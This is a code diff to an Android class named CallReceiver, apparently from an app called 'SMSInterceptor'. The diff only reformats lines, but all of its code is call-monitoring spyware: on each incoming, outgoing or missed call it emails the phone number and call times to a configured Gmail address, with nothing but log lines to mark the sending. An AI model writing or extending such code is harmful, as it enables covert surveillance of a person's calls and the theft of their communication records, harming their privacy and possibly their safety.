@@ -52,7 +52,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Incoming call started\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
+            gmailEmailString);
           Log.i(TAG, "onIncomingCallReceived() Sending E-mail.");
         }
         catch(Exception e) {
@@ -72,7 +74,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Incoming call answered\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
+            gmailEmailString);
           Log.i(TAG, "onIncomingCallAnswered() Sending E-mail.");
         }
         catch(Exception e) {
@@ -92,7 +96,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Incoming call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end,
+            gmailEmailString);
           Log.i(TAG, "onIncomingCallEnded() Sending E-mail.");
         }
         catch(Exception e) {
@@ -112,7 +118,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + endPoint(number, context) + "\nStart Time: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Outgoing call started!\nNumber: " + endPoint(number, context) + "\nStart Time: " + start,
+            gmailEmailString);
           Log.i(TAG, "onOutgoingCallStarted() Sending E-mail.");
         }
         catch(Exception e) {
@@ -132,7 +140,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Outgoing call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end,
+            gmailEmailString);
           Log.i(TAG, "onOutgoingCallEnded() Sending E-mail.");
         }
         catch(Exception e) {
@@ -152,7 +162,9 @@ public class CallReceiver extends PhoneCallReceiver {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + endPoint(number, context) + "\nTime: " + start, gmailEmailString);
+          sender.sendMail("SMSInterceptor",
+            "Missed call\nNumber: " + endPoint(number, context) + "\nTime: " + start,
+            gmailEmailString);
           Log.i(TAG, "onMissedCall() Sending E-mail.");
         }
         catch(Exception e) {
